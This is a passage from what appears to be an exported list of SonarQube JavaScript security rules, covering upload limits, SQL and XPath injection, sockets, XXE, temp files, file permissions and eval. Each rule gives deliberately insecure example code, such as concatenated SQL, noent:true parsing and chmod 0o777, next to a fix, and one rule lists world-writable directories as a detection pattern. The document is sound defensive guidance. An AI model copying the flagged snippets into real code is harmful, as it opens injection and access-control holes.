</pre>
<p><a href="https://www.npmjs.com/package/multer" rel="nofollow">multer</a> (Express.js middleware) file upload module:</p>
<pre>
let diskUpload &#61; multer({
  storage: diskStorage,
  limits: {
    fileSize: 10000000; // Sensitive: 10MB is more than the recommended limit of 8MB
  }
});

let diskUploadUnlimited &#61; multer({ // Sensitive: the default value is no limit
  storage: diskStorage,
});
</pre>
<p><a href="https://www.npmjs.com/package/body-parser" rel="nofollow">body-parser</a> module:</p>
<pre>
// 4MB is more than the recommended limit of 2MB for non-file-upload requests
let jsonParser &#61; bodyParser.json({ limit: &#34;4mb&#34; }); // Sensitive
let urlencodedParser &#61; bodyParser.urlencoded({ extended: false, limit: &#34;4mb&#34; }); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/formidable" rel="nofollow">formidable</a> file upload module:</p>
<pre>
const form &#61; new Formidable();
form.maxFileSize &#61; 8000000; // Compliant: 8MB
</pre>
<p><a href="https://www.npmjs.com/package/multer" rel="nofollow">multer</a> (Express.js middleware) file upload module:</p>
<pre>
let diskUpload &#61; multer({
  storage: diskStorage,
  limits: {
     fileSize: 8000000 // Compliant: 8MB
  }
});
</pre>
<p><a href="https://www.npmjs.com/package/body-parser" rel="nofollow">body-parser</a> module:</p>
<pre>
let jsonParser &#61; bodyParser.json(); // Compliant, when the limit is not defined, the default value is set to 100kb
let urlencodedParser &#61; bodyParser.urlencoded({ extended: false, limit: &#34;2mb&#34; }); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html" rel="nofollow">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/770" rel="nofollow">MITRE, CWE-770</a> - Allocation of Resources Without Limits or Throttling </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2077">
              javascript:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS3649&amp;rule_key&#61;javascript%3AS3649" rel="nofollow">S3649</a>), the goal is only to highlight complex/formatted
queries.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Some parts of the query come from untrusted values (like user inputs). </li><li> The query is repeated/duplicated in other parts of the code. </li><li> The application must support different types of relational databases. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html" rel="nofollow">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li><li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
// &#61;&#61;&#61; MySQL &#61;&#61;&#61;
const mysql &#61; require(&#39;mysql&#39;);
const mycon &#61; mysql.createConnection({ host: host, user: user, password: pass, database: db });
mycon.connect(function(err) {
  mycon.query(&#39;SELECT * FROM users WHERE id &#61; &#39; &#43; userinput, (err, res) &#61;&gt; {}); // Sensitive
});

// &#61;&#61;&#61; PostgreSQL &#61;&#61;&#61;
const pg &#61; require(&#39;pg&#39;);
const pgcon &#61; new pg.Client({ host: host, user: user, password: pass, database: db });
pgcon.connect();
pgcon.query(&#39;SELECT * FROM users WHERE id &#61; &#39; &#43; userinput, (err, res) &#61;&gt; {}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
// &#61;&#61;&#61; MySQL &#61;&#61;&#61;
const mysql &#61; require(&#39;mysql&#39;);
const mycon &#61; mysql.createConnection({ host: host, user: user, password: pass, database: db });
mycon.connect(function(err) {
  mycon.query(&#39;SELECT name FROM users WHERE id &#61; ?&#39;, [userinput], (err, res) &#61;&gt; {});
});

// &#61;&#61;&#61; PostgreSQL &#61;&#61;&#61;
const pg &#61; require(&#39;pg&#39;);
const pgcon &#61; new pg.Client({ host: host, user: user, password: pass, database: db });
pgcon.connect();
pgcon.query(&#39;SELECT name FROM users WHERE id &#61; $1&#39;, [userinput], (err, res) &#61;&gt; {});
</pre>
<h2>Exceptions</h2>
<p>This rule’s current implementation does not follow variables. It will only detect SQL queries which are formatted directly in the function
call.</p>
<pre>
const sql &#61; &#39;SELECT * FROM users WHERE id &#61; &#39; &#43; userinput;
mycon.query(sql, (err, res) &#61;&gt; {}); // Sensitive but no issue is raised.
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA" rel="nofollow">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO" rel="nofollow">Potential SQL/JDOQL Injection (JDO)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE" rel="nofollow">Potential SQL/HQL Injection (Hibernate)</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4817">
              javascript:S4817
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-6272" rel="nofollow">CVE-2016-6272</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-9149" rel="nofollow">CVE-2016-9149</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2012-4837" rel="nofollow">CVE-2012-4837</a> </li></ul>
<p>User-provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the XPATH expression might contain some unsafe input coming from a user. </li></ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Sensitive Code Example</h2>
<pre>
// &#61;&#61;&#61; Server side &#61;&#61;&#61;

var xpath &#61; require(&#39;xpath&#39;);
var xmldom &#61; require(&#39;xmldom&#39;);

var doc &#61; new xmldom.DOMParser().parseFromString(xml);
var nodes &#61; xpath.select(userinput, doc); // Sensitive
var node &#61; xpath.select1(userinput, doc); // Sensitive
</pre>
<pre>
// &#61;&#61;&#61; Client side &#61;&#61;&#61;

// Chrome, Firefox, Edge, Opera, and Safari use the evaluate() method to select nodes:
var nodes &#61; document.evaluate(userinput, xmlDoc, null, XPathResult.ANY_TYPE, null); // Sensitive

// Internet Explorer uses its own methods to select nodes:
var nodes &#61; xmlDoc.selectNodes(userinput); // Sensitive
var node &#61; xmlDoc.SelectSingleNode(userinput); // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/643" rel="nofollow">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4818">
              javascript:S4818
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2011-1785" rel="nofollow">CVE-2011-178</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-5645" rel="nofollow">CVE-2017-5645</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-6597" rel="nofollow">CVE-2018-6597</a> </li></ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul><li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li><li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li></ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> sockets are created without any limit every time a user performs an action. </li><li> input received from sockets is used without being sanitized. </li><li> sensitive data is sent via sockets without being encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li><li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li><li> <a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> any input read from the socket. </li><li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
const net &#61; require(&#39;net&#39;);

var socket &#61; new net.Socket(); // Sensitive
socket.connect(80, &#39;google.com&#39;);

// net.createConnection creates a new net.Socket, initiates connection with socket.connect(), then returns the net.Socket that starts the connection
net.createConnection({ port: port }, () &#61;&gt; {}); // Sensitive

// net.connect is an alias to net.createConnection
net.connect({ port: port }, () &#61;&gt; {}); // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption (&#39;Resource Exhaustion&#39;) </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6319">
              javascript:S6319
            </a>
          </td>
          <td>
            <details>
              <p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker
instances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries
physically access the storage media, they cannot decrypt encrypted data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The instance contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by
SageMaker, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sagemaker.CfnNotebookInstance.html" rel="nofollow"><code>aws-cdk-lib.aws-sagemaker.CfnNotebookInstance</code></a></p>
<pre>
import { CfnNotebookInstance } from &#39;aws-cdk-lib/aws-sagemaker&#39;;

new CfnNotebookInstance(this, &#39;example&#39;, {
      instanceType: &#39;instanceType&#39;,
      roleArn: &#39;roleArn&#39;
}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sagemaker.CfnNotebookInstance.html" rel="nofollow"><code>aws-cdk-lib.aws-sagemaker.CfnNotebookInstance</code></a></p>
<pre>
import { CfnNotebookInstance } from &#39;aws-cdk-lib/aws-sagemaker&#39;;

const encryptionKey &#61; new Key(this, &#39;example&#39;, {
    enableKeyRotation: true,
});
new CfnNotebookInstance(this, &#39;example&#39;, {
    instanceType: &#39;instanceType&#39;,
    roleArn: &#39;roleArn&#39;,
    kmsKeyId: encryptionKey.keyId
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html" rel="nofollow">Protect Data at Rest Using Encryption</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2755">
              javascript:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in libxmljs</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
var libxmljs &#61; require(&#39;libxmljs&#39;);
var fs &#61; require(&#39;fs&#39;);

var xml &#61; fs.readFileSync(&#39;xxe.xml&#39;, &#39;utf8&#39;);
libxmljs.parseXmlString(xml, {
    noblanks: true,
    noent: true, // Noncompliant
    nocdata: true
});
</pre>
<h4>Compliant solution</h4>
<p><code>parseXmlString</code> is safe by default.</p>
<pre data-diff-id="1" data-diff-type="compliant">
var libxmljs &#61; require(&#39;libxmljs&#39;);
var fs &#61; require(&#39;fs&#39;);

var xml &#61; fs.readFileSync(&#39;xxe.xml&#39;, &#39;utf8&#39;);
libxmljs.parseXmlString(xml);
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br /> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_%28XXE%29" rel="nofollow">OWASP Top 10 2017 Category A4</a> - XML External
  Entities (XXE) </li><li> <a href="https://cwe.mitre.org/data/definitions/611" rel="nofollow">MITRE, CWE-611</a> - Information Exposure Through XML External Entity Reference </li><li> <a href="https://cwe.mitre.org/data/definitions/827" rel="nofollow">MITRE, CWE-827</a> - Improper Control of Document Type Definition </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5443">
              javascript:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451" rel="nofollow">CVE-2012-2451</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838" rel="nofollow">CVE-2015-1838</a> </li></ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul><li> <code>/tmp</code> </li><li> <code>/var/tmp</code> </li><li> <code>/usr/tmp</code> </li><li> <code>/dev/shm</code> </li><li> <code>/dev/mqueue</code> </li><li> <code>/run/lock</code> </li><li> <code>/var/run/lock</code> </li><li> <code>/Library/Caches</code> </li><li> <code>/Users/Shared</code> </li><li> <code>/private/tmp</code> </li><li> <code>/private/var/tmp</code> </li><li> <code>\Windows\Temp</code> </li><li> <code>\Temp</code> </li><li> <code>\TMP</code> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Files are read from or written into a publicly writable folder </li><li> The application creates files with predictable names into a publicly writable folder </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use a dedicated sub-folder with tightly controlled permissions </li><li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul><li> The generated filename is unpredictable </li><li> The file is readable and writable only by the creating user ID </li><li> The file descriptor is not inherited by child processes </li><li> The file will be destroyed as soon as it is closed </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
const fs &#61; require(&#39;fs&#39;);

let tmp_file &#61; &#34;/tmp/temporary_file&#34;; // Sensitive
fs.readFile(tmp_file, &#39;utf8&#39;, function (err, data) {
  // ...
});
</pre>
<pre>
const fs &#61; require(&#39;fs&#39;);

let tmp_dir &#61; process.env.TMPDIR; // Sensitive
fs.readFile(tmp_dir &#43; &#34;/temporary_file&#34;, &#39;utf8&#39;, function (err, data) {
  // ...
});
</pre>
<h2>Compliant Solution</h2>
<pre>
const tmp &#61; require(&#39;tmp&#39;);

const tmpobj &#61; tmp.fileSync(); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE, CWE-377</a> - Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE, CWE-379</a> - Creation of Temporary File in Directory with Incorrect Permissions
  </li><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP, Insecure Temporary File</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S1525">
              javascript:S1525
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS4507&amp;rule_key&#61;javascript%3AS4507" rel="nofollow">S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint
in the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to
attacks in production.</p>
<h3>Noncompliant code example</h3>
<pre>
for (i &#61; 1; i&lt;5; i&#43;&#43;) {
  // Print i to the Output window.
  Debug.write(&#34;loop index is &#34; &#43; i);
  // Wait for user to resume.
  debugger;
}
</pre>
<h3>Compliant solution</h3>
<pre>
for (i &#61; 1; i&lt;5; i&#43;&#43;) {
  // Print i to the Output window.
  Debug.write(&#34;loop index is &#34; &#43; i);
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2612">
              javascript:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the &#34;<code>others</code>&#34; category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application is designed to be run on a multi-user environment. </li><li> Corresponding files and directories may contain confidential information. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>Node.js <a href="https://nodejs.org/api/fs.html" rel="nofollow"><code>fs</code></a></p>
<pre>
const fs &#61; require(&#39;fs&#39;);

fs.chmodSync(&#34;/tmp/fs&#34;, 0o777); // Sensitive
</pre>
<pre>
const fs &#61; require(&#39;fs&#39;);
const fsPromises &#61; fs.promises;

fsPromises.chmod(&#34;/tmp/fsPromises&#34;, 0o777); // Sensitive
</pre>
<pre>
const fs &#61; require(&#39;fs&#39;);
const fsPromises &#61; fs.promises

async function fileHandler() {
  let filehandle;
  try {
    filehandle &#61; fsPromises.open(&#39;/tmp/fsPromises&#39;, &#39;r&#39;);
    filehandle.chmod(0o777); // Sensitive
  } finally {
    if (filehandle !&#61;&#61; undefined)
      filehandle.close();
  }
}
</pre>
<p>Node.js <a href="https://nodejs.org/api/process.html#process_process_umask_mask" rel="nofollow"><code>process.umask</code></a></p>
<pre>
const process &#61; require(&#39;process&#39;);

process.umask(0o000); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Node.js <a href="https://nodejs.org/api/fs.html" rel="nofollow"><code>fs</code></a></p>
<pre>
const fs &#61; require(&#39;fs&#39;);

fs.chmodSync(&#34;/tmp/fs&#34;, 0o770); // Compliant
</pre>
<pre>
const fs &#61; require(&#39;fs&#39;);
const fsPromises &#61; fs.promises;

fsPromises.chmod(&#34;/tmp/fsPromises&#34;, 0o770); // Compliant
</pre>
<pre>
const fs &#61; require(&#39;fs&#39;);
const fsPromises &#61; fs.promises

async function fileHandler() {
  let filehandle;
  try {
    filehandle &#61; fsPromises.open(&#39;/tmp/fsPromises&#39;, &#39;r&#39;);
    filehandle.chmod(0o770); // Compliant
  } finally {
    if (filehandle !&#61;&#61; undefined)
      filehandle.close();
  }
}
</pre>
<p>Node.js <a href="https://nodejs.org/api/process.html#process_process_umask_mask" rel="nofollow"><code>process.umask</code></a></p>
<pre>
const process &#61; require(&#39;process&#39;);

process.umask(0o007); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" rel="nofollow">OWASP File Permission</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S1523">
              javascript:S1523
            </a>
          </td>
          <td>
            <details>
              <p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9807" rel="nofollow">CVE-2017-9807</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9802" rel="nofollow">CVE-2017-9802</a> </li></ul>
<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific
meta-programming use-cases. However most of the time their use is frowned upon as they also increase the risk of <a href="https://owasp.org/www-community/attacks/Code_Injection" rel="nofollow">Injected Code</a>. Such attacks can either run on the server or in the client (exemple:
XSS attack) and have a huge impact on an application’s security.</p>
<p>This rule raises issues on calls to <code>eval</code> and <code>Function</code> constructor. This rule does not detect code injections. It only
highlights the use of APIs which should be used sparingly and very carefully. The goal is to guide security code reviews.</p>
<p>The rule also flags string literals starting with <code>javascript:</code> as the code passed in <code>javascript:</code> URLs is evaluated the
same way as calls to <code>eval</code> or <code>Function</code> constructor.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the executed code may come from an untrusted source and hasn’t been sanitized. </li><li> you really need to run code dynamically. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href="https://en.wikipedia.org/wiki/Sandbox_%28computer_security%29" rel="nofollow">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a href="https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.&#43;Create&#43;a&#43;secure&#43;sandbox&#43;using&#43;a&#43;security&#43;manager" rel="nofollow">Security Managers</a> in java, <a href="https://www.w3schools.com/tags/att_iframe_sandbox.asp" rel="nofollow">iframes</a> and <a href="https://en.wikipedia.org/wiki/Same-origin_policy" rel="nofollow">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>Avoid using dynamic code APIs whenever possible. Hard-coded code is always safer.</p>
<h2>Sensitive Code Example</h2>
<pre>
let value &#61; eval(&#39;obj.&#39; &#43; propName); // Sensitive
let func &#61; Function(&#39;obj&#39; &#43; propName); // Sensitive
location.href &#61; &#39;javascript:void(0)&#39;; // Sensitive
</pre>
<h2>Exceptions</h2>
